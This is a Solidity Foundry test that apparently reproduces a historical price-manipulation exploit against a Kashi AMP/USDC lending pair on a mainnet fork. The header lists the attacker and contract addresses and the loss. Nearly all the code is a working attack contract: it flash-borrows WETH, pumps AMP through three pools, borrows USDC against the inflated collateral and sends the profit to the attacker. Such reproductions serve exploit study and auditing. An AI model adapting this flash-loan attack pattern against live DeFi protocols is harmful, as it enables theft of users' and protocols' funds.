// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 572.31 USDC
// Attacker : 0xda9d65086a986624cbf71989118938f0cf9a0c68
// Attack Contract : 0x7132492af58ab4c8787b381da997dfaeb3ca5f85
// Vulnerable Contract : 0x63d4026cbc902e538618b9aa51a4d05ef48ef5a4
// Attack Tx : https://etherscan.io/tx/0x21c91633ca99b991b3ba20e02b12bbeef187fd3fea756cece4748c2ee0173db3
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x63d4026cbc902e538618b9aa51a4d05ef48ef5a4#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/773
//
// The attacker flash-borrowed WETH, bought AMP through three pools, deposited the
// AMP into BentoBox, then added the shares as Kashi collateral. The inflated AMP
// collateral let the Kashi pair issue a USDC borrow. The attacker withdrew the
// borrowed USDC, swapped enough USDC back into WETH to repay Balancer, and kept
// the remaining USDC.

address constant ATTACKER = 0xdA9d65086A986624cbf71989118938f0CF9a0c68;
address constant HISTORICAL_ATTACK_CONTRACT = 0x7132492aF58aB4c8787b381Da997dfaEb3cA5f85;
address constant BALANCER_VAULT_ADDR = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant UNISWAP_V3_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
address constant BENTOBOX = 0xF5BCE5077908a1b7370B9ae04AdC565EBd643966;
address constant KASHI_PAIR = 0x63d4026cBC902E538618b9Aa51A4D05Ef48ef5a4;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant AMP_TOKEN = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;

uint256 constant FLASH_WETH_AMOUNT = 4.71 ether;
uint256 constant V3_AMP_BUY_WETH = 0.3768 ether;
uint256 constant UNISWAP_AMP_BUY_WETH = 1.6956 ether;
uint256 constant SUSHISWAP_AMP_BUY_WETH = 2.6376 ether;
uint256 constant BORROW_USDC_AMOUNT = 7_664_071_837;

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    function exactOutputSingle(
        ExactOutputSingleParams calldata params
    ) external payable returns (uint256 amountIn);
}

interface IUniV2SwapRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBentoBoxV1 {
    function masterContractOf(
        address clone
    ) external view returns (address masterContract);

    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function deposit(
        IERC20 token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);

    function withdraw(
        IERC20 token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IKashiPair {
    function accrue() external;

    function addCollateral(address to, bool skim, uint256 share) external;

    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function setUp() public {
        vm.createSelectFork("mainnet", 22_217_307);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(BALANCER_VAULT_ADDR, "Balancer Vault");
        vm.label(BENTOBOX, "BentoBox");
        vm.label(KASHI_PAIR, "Kashi AMP/USDC pair");
        vm.label(AMP_TOKEN, "AMP");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdcBefore = usdc.balanceOf(ATTACKER);

        AmpKashiExploit exploit = new AmpKashiExploit();
        exploit.attack();

        uint256 attackerProfit = usdc.balanceOf(ATTACKER) - attackerUsdcBefore;
        assertGt(attackerProfit, 572_000_000);
    }
}

contract AmpKashiExploit is IBalancerFlashLoanRecipient {
    IERC20 private constant weth = IERC20(WETH_TOKEN);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IERC20 private constant amp = IERC20(AMP_TOKEN);
    IBentoBoxV1 private constant bentoBox = IBentoBoxV1(BENTOBOX);
    IKashiPair private constant kashiPair = IKashiPair(KASHI_PAIR);
    ISwapRouter02 private constant swapRouter = ISwapRouter02(UNISWAP_V3_ROUTER);

    function attack() external {
        weth.approve(UNISWAP_V3_ROUTER, type(uint256).max);
        weth.approve(UNISWAP_V2_ROUTER, type(uint256).max);
        weth.approve(SUSHISWAP_ROUTER, type(uint256).max);
        amp.approve(BENTOBOX, type(uint256).max);
        usdc.approve(UNISWAP_V3_ROUTER, type(uint256).max);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH_AMOUNT;

        IFlashLoanVault(BALANCER_VAULT_ADDR).flashLoan(
            IBalancerFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            abi.encode(KASHI_PAIR)
        );
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT_ADDR, "vault");

        _buyAmp();

        kashiPair.accrue();
        address masterContract = bentoBox.masterContractOf(KASHI_PAIR);
        bentoBox.setMasterContractApproval(address(this), masterContract, true, 0, bytes32(0), bytes32(0));

        (, uint256 ampShare) = bentoBox.deposit(amp, address(this), address(this), amp.balanceOf(address(this)), 0);
        kashiPair.addCollateral(address(this), false, ampShare);

        (, uint256 borrowShare) = kashiPair.borrow(address(this), BORROW_USDC_AMOUNT);
        bentoBox.withdraw(usdc, address(this), address(this), 0, borrowShare);

        swapRouter.exactOutputSingle(
            ISwapRouter02.ExactOutputSingleParams({
                tokenIn: USDC_TOKEN,
                tokenOut: WETH_TOKEN,
                fee: 500,
                recipient: address(this),
                amountOut: FLASH_WETH_AMOUNT,
                amountInMaximum: usdc.balanceOf(address(this)),
                sqrtPriceLimitX96: 0
            })
        );

        usdc.transfer(ATTACKER, usdc.balanceOf(address(this)));
        weth.transfer(BALANCER_VAULT_ADDR, FLASH_WETH_AMOUNT);
    }

    function _buyAmp() private {
        swapRouter.exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: WETH_TOKEN,
                tokenOut: AMP_TOKEN,
                fee: 10_000,
                recipient: address(this),
                amountIn: V3_AMP_BUY_WETH,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        address[] memory path = new address[](2);
        path[0] = WETH_TOKEN;
        path[1] = AMP_TOKEN;

        IUniV2SwapRouter(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            UNISWAP_AMP_BUY_WETH,
            0,
            path,
            address(this),
            type(uint256).max
        );
        IUniV2SwapRouter(SUSHISWAP_ROUTER).swapExactTokensForTokens(
            SUSHISWAP_AMP_BUY_WETH,
            0,
            path,
            address(this),
            type(uint256).max
        );
    }
}
